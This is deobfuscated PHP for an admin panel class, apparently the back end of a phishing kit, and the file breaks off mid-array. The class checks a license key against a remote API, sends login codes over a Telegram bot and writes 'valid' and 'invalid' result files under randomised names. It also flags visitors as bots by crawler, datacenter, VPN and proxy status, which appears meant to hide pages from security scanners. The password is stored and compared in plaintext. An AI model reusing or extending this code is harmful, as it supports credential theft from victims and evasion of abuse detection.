<?php

error_reporting(0);
ini_set("display_errors", 0);
session_start();
class User
{
    private $api_url = "https://kratools.com/api/key";
    private $get_ip = "https://kratools.com/api/get-ip";
    public function create_password($C28c4c4383d8880194ac88e5, $f454d2812f33c03d518128fd, $F81f66258eb2e7b5176e60ce)
    {
        $C28c4c4383d8880194ac88e5 = $this->escapeString($C28c4c4383d8880194ac88e5);
        if ($this->isStrongPassword($C28c4c4383d8880194ac88e5)) {
            $f454d2812f33c03d518128fd = $this->escapeString($f454d2812f33c03d518128fd);
            $Bea20cb922eb92bdb23d49a3 = $this->api_url;
            $F959ee249a08352c781290e9 = array("code" => $f454d2812f33c03d518128fd);
            $E1f566f566bf4b3097b09621 = $this->curl("POST", $Bea20cb922eb92bdb23d49a3, $F959ee249a08352c781290e9);
            $E1f566f566bf4b3097b09621 = json_decode($E1f566f566bf4b3097b09621, true);
            if ($E1f566f566bf4b3097b09621["live"]) {
                if (!$E1f566f566bf4b3097b09621["expired"]) {
                    $config = (require "../config.php");
                    if ($this->isAlphaOnly($F81f66258eb2e7b5176e60ce)) {
                        if (!($F81f66258eb2e7b5176e60ce != "admin")) {
                            Eab9d00f9219823236b178ab:
                            $config["files"] = ["valid" => "page/result/" . $this->generateRandomStringChar(8) . ".json", "invalid" => "page/result/" . $this->generateRandomStringChar(8) . ".json", "visit" => "page/result/" . $this->generateRandomStringChar(8) . ".json", "cookie" => $this->generateRandomStringChar(8), "js" => $this->generateRandomStringChar(8)];
                            $config["key"] = $f454d2812f33c03d518128fd;
                            $config["folder"] = $F81f66258eb2e7b5176e60ce;
                            $config["password"] = $C28c4c4383d8880194ac88e5;
                            $ad5e933b22d9fba402c3e883 = "<?php\n\n\$config = " . var_export($config, true) . ";\nreturn \$config;\n";
                            file_put_contents("../config.php", $ad5e933b22d9fba402c3e883);
                            $b45ebac087ee66ba69a99410["status"] = "success";
                            $b45ebac087ee66ba69a99410["message"] = "Login successful!";
                            $_SESSION["login"] = true;
                            // [PHPDeobfuscator] Implied goto
                            goto Fe7300482f8db293e6365654;
                        }
                        $dd0a3594eeb51139ba19895f = $this->renameFolder("/home/scarface/Documents/github/PHPDeobfuscator/../admin", "/home/scarface/Documents/github/PHPDeobfuscator/../" . $F81f66258eb2e7b5176e60ce);
                        if ($dd0a3594eeb51139ba19895f["success"]) {
                            goto Eab9d00f9219823236b178ab;
                        }
                        $b45ebac087ee66ba69a99410["status"] = "error";
                        $b45ebac087ee66ba69a99410["message"] = $dd0a3594eeb51139ba19895f["reason"];
                        echo json_encode($b45ebac087ee66ba69a99410);
                        die;
                    }
                    $b45ebac087ee66ba69a99410["status"] = "error";
                    $b45ebac087ee66ba69a99410["message"] = "Folder name must be alphabetic only.";
                    echo json_encode($b45ebac087ee66ba69a99410);
                    die;
                }
                $b45ebac087ee66ba69a99410["status"] = "error";
                $b45ebac087ee66ba69a99410["message"] = "Key is expired!";
                goto Fe7300482f8db293e6365654;
            }
            $b45ebac087ee66ba69a99410["status"] = "error";
            $b45ebac087ee66ba69a99410["message"] = $E1f566f566bf4b3097b09621["error"];
            goto cc294cda4e0169f3e6ece385;
        }
        $b45ebac087ee66ba69a99410["status"] = "error";
        $b45ebac087ee66ba69a99410["message"] = "Minimal password length is 8.";
        Fe7300482f8db293e6365654:
        cc294cda4e0169f3e6ece385:
        echo json_encode($b45ebac087ee66ba69a99410);
    }
    public function isAlphaOnly($Da66e8e72c7acc9a4c787d51)
    {
        return preg_match("/^[a-zA-Z]+\$/", $Da66e8e72c7acc9a4c787d51);
    }
    private function SendMessageTelegram($b92ad36f7f02e2a66d054267, $F2ead49b372fc823353d3ce5, $db79ffdc85a3b803bc7890ba)
    {
        $Bea20cb922eb92bdb23d49a3 = "https://api.telegram.org/bot{$b92ad36f7f02e2a66d054267}/sendMessage";
        $F959ee249a08352c781290e9 = ["chat_id" => $F2ead49b372fc823353d3ce5, "text" => $db79ffdc85a3b803bc7890ba, "parse_mode" => "HTML"];
        $A69cebb208d5674eed850942 = curl_init($Bea20cb922eb92bdb23d49a3);
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_POST, true);
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_POSTFIELDS, http_build_query($F959ee249a08352c781290e9));
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_HTTPHEADER, ["Content-type: application/x-www-form-urlencoded"]);
        $e8a0fc5ed0ff6ede95e0dfc3 = curl_exec($A69cebb208d5674eed850942);
        if (!curl_errno($A69cebb208d5674eed850942)) {
            goto B891a6a994b39504b1da5e7b;
        }
        echo "Error:" . curl_error($A69cebb208d5674eed850942);
        B891a6a994b39504b1da5e7b:
        curl_close($A69cebb208d5674eed850942);
        return json_decode($e8a0fc5ed0ff6ede95e0dfc3, true);
    }
    public function renameFolder($ef2d1e00d671a04dd9f27021, $a6182c0ec8f2956981355769)
    {
        $B011f4d19dd15d8f39b4fdfb = '';
        if (is_dir($ef2d1e00d671a04dd9f27021)) {
            if (is_writable($ef2d1e00d671a04dd9f27021)) {
                if (!(is_dir($a6182c0ec8f2956981355769) && !is_writable($a6182c0ec8f2956981355769))) {
                    if (!rename($ef2d1e00d671a04dd9f27021, $a6182c0ec8f2956981355769)) {
                        $B011f4d19dd15d8f39b4fdfb = "Failed to rename folder.";
                        return array("success" => false, "reason" => "Failed to rename folder.");
                    }
                    return array("success" => true, "reason" => "");
                }
                $B011f4d19dd15d8f39b4fdfb = "New folder exists and is not writable.";
                return array("success" => false, "reason" => "New folder exists and is not writable.");
            }
            $B011f4d19dd15d8f39b4fdfb = "Old folder is not writable.";
            return array("success" => false, "reason" => "Old folder is not writable.");
        }
        $B011f4d19dd15d8f39b4fdfb = "Old folder does not exist.";
        return array("success" => false, "reason" => "Old folder does not exist.");
    }
    public function sendCode()
    {
        $config = (require "../config.php");
        if (!$config["telegram"]["twofactor"]) {
            goto e9677437626fbabfa9c96e43;
        }
        $b25ad3d13b402c18d1a29609 = $this->generateRandomString();
        $_SESSION["code"] = $b25ad3d13b402c18d1a29609;
        $db79ffdc85a3b803bc7890ba = "Admin Panel\n\nCode : <code>{$b25ad3d13b402c18d1a29609}</code>";
        $this->SendMessageTelegram($config["telegram"]["bot_token"], $config["telegram"]["chat_id"], $db79ffdc85a3b803bc7890ba);
        e9677437626fbabfa9c96e43:
    }
    public function isStrongPassword($C28c4c4383d8880194ac88e5)
    {
        $A7742c16dc323862adeda3a1 = 8;
        if (!(strlen($C28c4c4383d8880194ac88e5) < $A7742c16dc323862adeda3a1)) {
            return true;
        }
        return false;
    }
    public function generateRandomString($fd07cad276e28956d940d0bb = 10)
    {
        return substr(str_shuffle(str_repeat($d767eb4dbab44c6f382c19ad = "abcdefghijklomnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", ceil($fd07cad276e28956d940d0bb / strlen($d767eb4dbab44c6f382c19ad)))), 1, $fd07cad276e28956d940d0bb);
    }
    public function removeUrlParameters($Bea20cb922eb92bdb23d49a3)
    {
        $D2b6fa20b839bf3be2e6355d = parse_url($Bea20cb922eb92bdb23d49a3);
        $f66bdc9cb509cb8919399ac3 = isset($D2b6fa20b839bf3be2e6355d["scheme"]) ? $D2b6fa20b839bf3be2e6355d["scheme"] . "://" : '';
        $f66bdc9cb509cb8919399ac3 .= isset($D2b6fa20b839bf3be2e6355d["host"]) ? $D2b6fa20b839bf3be2e6355d["host"] : '';
        $f66bdc9cb509cb8919399ac3 .= isset($D2b6fa20b839bf3be2e6355d["path"]) ? $D2b6fa20b839bf3be2e6355d["path"] : '';
        return $f66bdc9cb509cb8919399ac3;
    }
    public function removeLastTwoDirectories($Bea20cb922eb92bdb23d49a3)
    {
        $D2b6fa20b839bf3be2e6355d = parse_url($Bea20cb922eb92bdb23d49a3);
        $a408895cfe4d9af82694f249 = explode("/", trim($D2b6fa20b839bf3be2e6355d["path"], "/"));
        $b365a99d52602f0af2895893 = array_slice($a408895cfe4d9af82694f249, 0, -2);
        $Dd40537a4b5584258946c932 = "/" . implode("/", $b365a99d52602f0af2895893);
        $ed5d5ba6f933bcec46acc981 = (isset($D2b6fa20b839bf3be2e6355d["scheme"]) ? $D2b6fa20b839bf3be2e6355d["scheme"] . "://" : '') . (isset($D2b6fa20b839bf3be2e6355d["host"]) ? $D2b6fa20b839bf3be2e6355d["host"] : '') . $Dd40537a4b5584258946c932;
        if (!isset($D2b6fa20b839bf3be2e6355d["query"])) {
            goto Bbce8a0745e51f74e4f69bf1;
        }
        $ed5d5ba6f933bcec46acc981 .= "?" . $D2b6fa20b839bf3be2e6355d["query"];
        Bbce8a0745e51f74e4f69bf1:
        return rtrim($ed5d5ba6f933bcec46acc981, "/");
    }
    public function getLastSegmentFromUrl()
    {
        $Bea20cb922eb92bdb23d49a3 = $_SERVER["REQUEST_URI"];
        $B9531f4bdbdc1598e9fae5fd = parse_url($Bea20cb922eb92bdb23d49a3, PHP_URL_PATH);
        $B9531f4bdbdc1598e9fae5fd = trim($B9531f4bdbdc1598e9fae5fd, "/");
        $a533a84f8c2aadc442beecf1 = explode("/", $B9531f4bdbdc1598e9fae5fd);
        if (!(count($a533a84f8c2aadc442beecf1) > 1)) {
            return null;
        }
        return $a533a84f8c2aadc442beecf1[count($a533a84f8c2aadc442beecf1) - 2];
    }
    public function login($C28c4c4383d8880194ac88e5)
    {
        $C28c4c4383d8880194ac88e5 = $this->escapeString($C28c4c4383d8880194ac88e5);
        $config = (require "../config.php");
        if ($config["password"] == $C28c4c4383d8880194ac88e5) {
            $b45ebac087ee66ba69a99410["status"] = "success";
            $b45ebac087ee66ba69a99410["message"] = "Login successful!";
            $_SESSION["login"] = true;
            // [PHPDeobfuscator] Implied goto
            goto B893dd19c66c17a9956e542d;
        }
        $b45ebac087ee66ba69a99410["status"] = "error";
        $b45ebac087ee66ba69a99410["message"] = "Password incorrect";
        B893dd19c66c17a9956e542d:
        echo json_encode($b45ebac087ee66ba69a99410);
    }
    public function login_2fa($C28c4c4383d8880194ac88e5, $abdbe2600563e1a6a169933c)
    {
        $C28c4c4383d8880194ac88e5 = $this->escapeString($C28c4c4383d8880194ac88e5);
        $abdbe2600563e1a6a169933c = $this->escapeString($abdbe2600563e1a6a169933c);
        $config = (require "../config.php");
        if ($config["password"] == $C28c4c4383d8880194ac88e5 && $abdbe2600563e1a6a169933c == $_SESSION["code"]) {
            $b45ebac087ee66ba69a99410["status"] = "success";
            $b45ebac087ee66ba69a99410["message"] = "Login successful!";
            $_SESSION["login"] = true;
            // [PHPDeobfuscator] Implied goto
            goto B780e07705818da1cfb6fca6;
        }
        $b45ebac087ee66ba69a99410["status"] = "error";
        $b45ebac087ee66ba69a99410["message"] = "Password or Code incorrect";
        B780e07705818da1cfb6fca6:
        echo json_encode($b45ebac087ee66ba69a99410);
    }
    public function logout()
    {
        if (!isset($_SESSION["login"])) {
            goto D86a93dd33f76ca19c177778;
        }
        session_destroy();
        D86a93dd33f76ca19c177778:
    }
    public function check()
    {
        if (isset($_SESSION["login"])) {
            // [PHPDeobfuscator] Implied return
            return;
        }
        header("Location: login");
        die;
    }
    public function curl($be3eae3058031c3731feb747, $Bea20cb922eb92bdb23d49a3, $F959ee249a08352c781290e9)
    {
        $A69cebb208d5674eed850942 = curl_init();
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_URL, $Bea20cb922eb92bdb23d49a3);
        if (!($be3eae3058031c3731feb747 == "POST")) {
            goto de7c7faea436b3254aadb680;
        }
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_POST, true);
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_POSTFIELDS, http_build_query($F959ee249a08352c781290e9));
        de7c7faea436b3254aadb680:
        curl_setopt($A69cebb208d5674eed850942, CURLOPT_RETURNTRANSFER, true);
        $E1f566f566bf4b3097b09621 = curl_exec($A69cebb208d5674eed850942);
        if (!($E1f566f566bf4b3097b09621 === false)) {
            goto de02651a4d44156791f7d47b;
        }
        echo "cURL error: " . curl_error($A69cebb208d5674eed850942);
        de02651a4d44156791f7d47b:
        curl_close($A69cebb208d5674eed850942);
        return $E1f566f566bf4b3097b09621;
    }
    public function emptyFile($Bdb2c52c92777160dc3882f1)
    {
        $config = (require "../config.php");
        $b0c176eb8a052ce821bbc1ee = ["visitor" => $config["files"]["visit"], "invalid" => $config["files"]["invalid"], "valid" => $config["files"]["valid"]];
        if (!array_key_exists($Bdb2c52c92777160dc3882f1, $b0c176eb8a052ce821bbc1ee)) {
            goto Fa170e1186a9f330c601c2fc;
        }
        $f4bc7a28bc28b356f9e293eb = "../" . $b0c176eb8a052ce821bbc1ee[$Bdb2c52c92777160dc3882f1];
        echo $f4bc7a28bc28b356f9e293eb;
        if (!(file_exists($f4bc7a28bc28b356f9e293eb) && is_writable($f4bc7a28bc28b356f9e293eb))) {
            goto c728404642c6f32015585ffe;
        }
        $f42f4d1c57016a0f8163687a = fopen($f4bc7a28bc28b356f9e293eb, "w");
        if (!$f42f4d1c57016a0f8163687a) {
            goto dd8b1ec1fa4a32428140fd61;
        }
        fclose($f42f4d1c57016a0f8163687a);
        dd8b1ec1fa4a32428140fd61:
        c728404642c6f32015585ffe:
        Fa170e1186a9f330c601c2fc:
    }
    public function getServerIp()
    {
        $Bea20cb922eb92bdb23d49a3 = $this->get_ip;
        $E1f566f566bf4b3097b09621 = $this->curl("GET", $Bea20cb922eb92bdb23d49a3, '');
        $E1f566f566bf4b3097b09621 = json_decode($E1f566f566bf4b3097b09621, true);
        return $E1f566f566bf4b3097b09621["ip"];
    }
    private function escapeString($cd8a63c03dc4eeb149921e94)
    {
        $cd8a63c03dc4eeb149921e94 = htmlspecialchars(strip_tags($cd8a63c03dc4eeb149921e94), ENT_QUOTES, "UTF-8");
        $cd8a63c03dc4eeb149921e94 = str_replace("<", '', $cd8a63c03dc4eeb149921e94);
        $cd8a63c03dc4eeb149921e94 = str_replace("'", '', $cd8a63c03dc4eeb149921e94);
        return $cd8a63c03dc4eeb149921e94;
    }
    public function readJsonFile($config, $A65255852ea5d557756bf870)
    {
        $Aea85d1154fb4985210583c0 = "/home/scarface/Documents/github/PHPDeobfuscator";
        if ($A65255852ea5d557756bf870 == "visit") {
            $f42f4d1c57016a0f8163687a = "/home/scarface/Documents/github/PHPDeobfuscator/../" . $config["files"]["visit"];
            // [PHPDeobfuscator] Implied goto
            goto b145d00a4660c3a5a306f794;
        }
        if ($A65255852ea5d557756bf870 == "valid") {
            $f42f4d1c57016a0f8163687a = $Aea85d1154fb4985210583c0 . "/../" . $config["files"]["valid"];
            // [PHPDeobfuscator] Implied goto
            goto D669de18830c177fe3760c3a;
        }
        if (!($A65255852ea5d557756bf870 == "invalid")) {
            goto f2bd503e0ef720c830863b35;
        }
        $f42f4d1c57016a0f8163687a = $Aea85d1154fb4985210583c0 . "/../" . $config["files"]["invalid"];
        f2bd503e0ef720c830863b35:
        D669de18830c177fe3760c3a:
        b145d00a4660c3a5a306f794:
        if (file_exists($f42f4d1c57016a0f8163687a)) {
            $e8d9d304a6f10b6068de12d3 = file_get_contents($f42f4d1c57016a0f8163687a);
            $F959ee249a08352c781290e9 = json_decode($e8d9d304a6f10b6068de12d3, true);
            $e8a0fc5ed0ff6ede95e0dfc3["draw"] = 1;
            $e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"] = 0;
            $e8a0fc5ed0ff6ede95e0dfc3["recordsFiltered"] = 0;
            $e8a0fc5ed0ff6ede95e0dfc3["botCount"] = 0;
            $e8a0fc5ed0ff6ede95e0dfc3["data"] = [];
            if (!is_array($F959ee249a08352c781290e9)) {
                goto F6bc0df523832940b6b6060f;
            }
            foreach ($F959ee249a08352c781290e9 as $bad22140208f0f06e3fa04d9) {
                $bad22140208f0f06e3fa04d9 = $this->checkBotSecurity($config, $bad22140208f0f06e3fa04d9);
                if (!$bad22140208f0f06e3fa04d9["info"]["is_bot"]) {
                    goto Bf48c702ddf979cb05b95120;
                }
                $e8a0fc5ed0ff6ede95e0dfc3["botCount"]++;
                Bf48c702ddf979cb05b95120:
                $e85b4c37b7d3112c517e0230 = array_merge($bad22140208f0f06e3fa04d9, $bad22140208f0f06e3fa04d9["info"]);
                unset($e85b4c37b7d3112c517e0230["info"]);
                $e8a0fc5ed0ff6ede95e0dfc3["data"][$e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"]] = $e85b4c37b7d3112c517e0230;
                if (!($A65255852ea5d557756bf870 == "valid" || $A65255852ea5d557756bf870 == "invalid")) {
                    goto c5e75b74fce0028b34a87d56;
                }
                $e85b4c37b7d3112c517e0230 = array_merge($e8a0fc5ed0ff6ede95e0dfc3["data"][$e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"]], $e8a0fc5ed0ff6ede95e0dfc3["data"][$e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"]]["details"]);
                unset($e85b4c37b7d3112c517e0230["details"]);
                $e8a0fc5ed0ff6ede95e0dfc3["data"][$e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"]] = $e85b4c37b7d3112c517e0230;
                c5e75b74fce0028b34a87d56:
                $e8a0fc5ed0ff6ede95e0dfc3["recordsTotal"]++;
            }
            F6bc0df523832940b6b6060f:
            return is_array($e8a0fc5ed0ff6ede95e0dfc3) ? $e8a0fc5ed0ff6ede95e0dfc3 : [];
        }
        file_put_contents($f42f4d1c57016a0f8163687a, json_encode([]));
        return array();
    }
    public function getFullUrl()
    {
        $ebdbdf265a8a01d407929b69 = !empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" ? "https://" : "http://";
        $ea476fd90acdeb34c5140a4d = $ebdbdf265a8a01d407929b69 . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
        return $ea476fd90acdeb34c5140a4d;
    }
    public function generateRandomStringChar($fd07cad276e28956d940d0bb = 10)
    {
        return substr(str_shuffle(str_repeat($d767eb4dbab44c6f382c19ad = "abcdefghijklomnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", ceil($fd07cad276e28956d940d0bb / strlen($d767eb4dbab44c6f382c19ad)))), 1, $fd07cad276e28956d940d0bb);
    }
    public function checkUserSecurity($config, $e8a0fc5ed0ff6ede95e0dfc3)
    {
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = false;
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["status"]) {
            goto dcd29d8d36d14f350d2eed79;
        }
        if (!($config["bot"]["crawler"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_crawler"])) {
            goto d9bac3d707eb80d4ab220bb9;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        d9bac3d707eb80d4ab220bb9:
        if (!($config["bot"]["datacenter"] != 0)) {
            goto eef4653959510d4e05c83f54;
        }
        if ($e8a0fc5ed0ff6ede95e0dfc3["info"]["is_datacenter"] != false && $config["bot"]["datacenter"] == 2) {
            $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
            // [PHPDeobfuscator] Implied goto
            goto C56b3e4afee37d08bfe770fe;
        }
        if (!($e8a0fc5ed0ff6ede95e0dfc3["info"]["is_datacenter"] != false && $config["bot"]["datacenter"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_blocked_datacenter"] == true)) {
            goto Be19c70386d95f8d7ad09bd4;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        Be19c70386d95f8d7ad09bd4:
        C56b3e4afee37d08bfe770fe:
        eef4653959510d4e05c83f54:
        if (!($config["bot"]["vpn"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_vpn"])) {
            goto Be77042e1092501a891325cb;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        Be77042e1092501a891325cb:
        if (!($config["bot"]["proxy"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_proxy"])) {
            goto d560e1f625f7b326d9c64394;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        d560e1f625f7b326d9c64394:
        if (!($config["bot"]["abuser"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_abuser"])) {
            goto B78af2df3eb1316a0ffb6ad9;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        B78af2df3eb1316a0ffb6ad9:
        dcd29d8d36d14f350d2eed79:
        if ($e8a0fc5ed0ff6ede95e0dfc3["valid_captcha"]) {
            goto d244e259cbc8b6e1418e7195;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        d244e259cbc8b6e1418e7195:
        return $e8a0fc5ed0ff6ede95e0dfc3;
    }
    public function checkBotSecurity($config, $e8a0fc5ed0ff6ede95e0dfc3)
    {
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = false;
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["status"]) {
            goto Ec18f9e6670b09493141b3ba;
        }
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["is_crawler"]) {
            goto e2d13fcf8141c103b19f58fe;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        e2d13fcf8141c103b19f58fe:
        if (!($e8a0fc5ed0ff6ede95e0dfc3["info"]["is_datacenter"] != false && $config["bot"]["datacenter"] == 1 && $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_blocked_datacenter"] == true)) {
            goto d292571f6f23a77c0e5381ee;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        d292571f6f23a77c0e5381ee:
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["is_vpn"]) {
            goto cf013bc4c25546478cbaa2a3;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        cf013bc4c25546478cbaa2a3:
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["is_proxy"]) {
            goto f1c499d03693bf7868c7a32e;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        f1c499d03693bf7868c7a32e:
        if (!$e8a0fc5ed0ff6ede95e0dfc3["info"]["is_abuser"]) {
            goto Ba00e034ccc073ca687aa51c;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        Ba00e034ccc073ca687aa51c:
        Ec18f9e6670b09493141b3ba:
        if ($e8a0fc5ed0ff6ede95e0dfc3["valid_captcha"]) {
            goto F1a1d91c78a1b19201b2063d;
        }
        $e8a0fc5ed0ff6ede95e0dfc3["info"]["is_bot"] = true;
        F1a1d91c78a1b19201b2063d:
        return $e8a0fc5ed0ff6ede95e0dfc3;
    }
    public function getCountry()
    {
        $f29c97e71e7a34e1f60a3b5d = ["AF" => "Afghanistan", "AL" => "Albania", "DZ" => "Algeria", "AD" => "Andorra", "AO" => "Angola", "AG" => "Antigua and Barbuda", "AR" => "Argentina", "AM" => "Armenia", "AU" => "Australia", "AT" => "Austria", "AZ" => "Azerbaijan", "BS" => "Bahamas", "BH" => "Bahrain", "BD" => "Bangladesh", "BB" => "Barbados", "BY" => "Belarus", "BE" => "Belgium", "BZ" => "Belize", "BJ" => "Benin", "BT" => "Bhutan", "BO" => "Bolivia", "BA" => "Bosnia and Herzegovina", "BW" => "Botswana", "BR" => "Brazil", "BN" => "Brunei", "BG" => "Bulgaria", "BF" => "Burkina Faso", "BI" => "Burundi", "CV" => "Cabo Verde", "KH" => "Cambodia", "CM" => "Cameroon", "CA" => "Canada", "CF" => "Central African Republic", "TD" => "Chad", "CL" => "Chile", "CN" => "China", "CO" => "Colombia", "KM" => "Comoros", "CD" => "Congo, Democratic Republic of the", "CG" => "Congo, Republic of the", "CR" => "Costa Rica", "HR" => "Croatia", "CU" => "Cuba", "CY" => "Cyprus", "CZ" => "Czech Republic", "DK" => "Denmark", "DJ" => "Djibouti", "DM" => "Dominica", "DO" => "Dominican Republic", "EC" => "Ecuador", "EG" => "Egypt", "SV" => "El Salvador", "GQ" => "Equatorial Guinea", "ER" => "Eritrea", "EE" => "Estonia", "SZ" => "Eswatini", "ET" => "Ethiopia", "FJ" => "Fiji", "FI" => "Finland", "FR" => "France", "GA" => "Gabon", "GM" => "Gambia", "GE" => "Georgia", "DE" => "Germany", "GH" => "Ghana", "GR" => "Greece", "GD" => "Grenada", "GT" => "Guatemala", "GN" => "Guinea", "GW" => "Guinea-Bissau", "GY" => "Guyana", "HT" => "Haiti", "HN" => "Honduras", "HU" => "Hungary", "IS" => "Iceland", "IN" => "India", "ID" => "Indonesia", "IR" => "Iran", "IQ" => "Iraq", "IE" => "Ireland", "IL" => "Israel", "IT" => "Italy", "JM" => "Jamaica", "JP" => "Japan", "JE" => "Jersey", "JO" => "Jordan", "KZ" => "Kazakhstan", "KE" => "Kenya", "KI" => "Kiribati", "KP" => "Korea, North", "KR" => "Korea, South", "KW" => "Kuwait", "KG" => "Kyrgyzstan", "LA" => "Laos", "LV" => "Latvia", "LB" => "Lebanon", "LS" => "Lesotho", "LR" => "Liberia", "LY" => "Libya", "LI" => "Liechtenstein", "LT" => "Lithuania", "LU" => "Luxembourg", "MG" => "Madagascar", "MW" => "Malawi", "MY" => "Malaysia", "MV" => "Maldives", "ML" => "Mali", "MT" => "Malta", "MH" => "Marshall Islands", "MR" => "Mauritania", "MU" => "Mauritius", "MX" => "Mexico", "FM" => "Micronesia", "MD" => "Moldova", "MC" => "Monaco", "MN" => "Mongolia", "ME" => "Montenegro", "MA" => "Morocco", "MZ" => "Mozambique", "MM" => "Myanmar", "NA" => "Namibia", "NR" => "Nauru", "NP" => "Nepal", "NL" => "Netherlands", "NZ" => "New Zealand", "NI" => "Nicaragua", "NE" => "Niger", "NG" => "Nigeria", "MK" => "North Macedonia", "NO" => "Norway", "OM" => "Oman", "PK" => "Pakistan", "PW" => "Palau", "PS" => "Palestine", "PA" => "Panama", "PG" => "Papua New Guinea", "PY" => "Paraguay", "PE" => "Peru", "PH" => "Philippines", "PL" => "Poland", "PT" => "Portugal", "QA" => "Qatar", "RE" => "R\xc3\xa9union", "RO" => "Romania", "RU" => "Russia", "RW" => "Rwanda", "WS" => "Samoa", "SM" => "San Marino", "ST" => "Sao Tome and Principe", "SA" => "Saudi Arabia", "SN" => "Senegal", "RS" => "Serbia", "SC" => "Seychelles", "SL" => "Sierra Leone", "SG" => "Singapore", "SK" => "Slovakia", "SI" => "Slovenia", "SB" => "Solomon Islands", "SO" => "Somalia", "ZA" => "South Africa", "SS" => "South Sudan", "ES" => "Spain", "LK" => "Sri Lanka", "SD" => "Sudan", "SR" => "Suriname", "SW" => "Sweden", "CH" => "Switzerland", "SY" => "Syria", "TW" => "Taiwan", "TJ" => "Tajikistan", "TZ" => "Tanzania", "TH" => "Thailand", "TL" => "Timor-Leste", "TG" => "Togo", "TO" => "Tonga", "TT" => "Trinidad and Tobago", "TN" => "Tunisia", "TR" => "Turkey", "TM" => "Turkmenistan", "TV" => "Tuvalu", "UG" => "Uganda", "UA" => "Ukraine", "AE" => "United Arab Emirates", "GB" => "United Kingdom", "US" => "United States", "UY" => "Uruguay", "UZ" => "Uzbekistan", "VU" => "Vanuatu", "VE" => "Venezuela", "VN" => "Vietnam", "YE" => "Yemen", "ZM" => "Zambia", "ZW" => "Zimbabwe"];
        return array("AF" => "Afghanistan", "AL" => "Albania", "DZ" => "Algeria", "AD" => "Andorra", "AO" => "Angola", "AG" => "Antigua and Barbuda", "AR" => "Argentina", "AM" => "Armenia", "AU" => "Australia", "AT" => "Austria", "AZ" => "Azerbaijan", "BS" => "Bahamas", "BH" => "Bahrain", "BD" => "Bangladesh", "BB" => "Barbados", "BY" => "Belarus", "BE" => "Belgium", "BZ" => "Belize", "BJ" => "Benin", "BT" => "Bhutan", "BO" => "Bolivia", "BA" => "Bosnia and Herzegovina", "BW" => "Botswana", "BR" => "Brazil", "BN" => "Brunei", "BG" => "Bulgaria", "BF" => "Burkina Faso", "BI" => "Burundi", "CV" => "Cabo Verde", "KH" => "Cambodia", "CM" => "Cameroon", "CA" => "Canada", "CF" => "Central African Republic", "TD" => "Chad", "CL" => "Chile", "CN" => "China", "CO" => "Colombia", "KM" => "Comoros", "CD" => "Congo, Democratic Republic of the", "CG" => "Congo, Republic of the", "CR" => "Costa Rica", "HR" => "Croatia", "CU" => "Cuba", "CY" => "Cyprus", "CZ" => "Czech Republic", "DK" => "Denmark", "DJ" => "Djibouti", "DM" => "Dominica", "DO" => "Dominican Republic", "EC" => "Ecuador", "EG" => "Egypt", "SV" => "El Salvador", "GQ" => "Equatorial Guinea", "ER" => "Eritrea", "EE" => "Estonia", "SZ" => "Eswatini", "ET" => "Ethiopia", "FJ" => "Fiji", "FI" => "Finland", "FR" => "France", "GA" => "Gabon", "GM" => "Gambia", "GE" => "Georgia", "DE" => "Germany", "GH" => "Ghana", "GR" => "Greece", "GD" => "Grenada", "GT" => "Guatemala", "GN" => "Guinea", "GW" => "Guinea-Bissau", "GY" => "Guyana", "HT" => "Haiti", "HN" => "Honduras", "HU" => "Hungary", "IS" => "Iceland", "IN" => "India", "ID" => "Indonesia", "IR" => "Iran", "IQ" => "Iraq", "IE" => "Ireland", "IL" => "Israel", "IT" => "Italy", "JM" => "Jamaica", "JP" => "Japan", "JE" => "Jersey", "JO" => "Jordan", "KZ" => "Kazakhstan", "KE" => "Kenya", "KI" => "Kiribati", "KP" => "Korea, North", "KR" => "Korea, South", "KW" => "Kuwait", "KG" => "Kyrgyzstan", "LA" => "Laos", "LV" => "Latvia", "LB" => "Lebanon", "LS" => "Lesotho", "LR" => "Liberia", "LY" => "Libya", "LI" => "Liechtenstein", 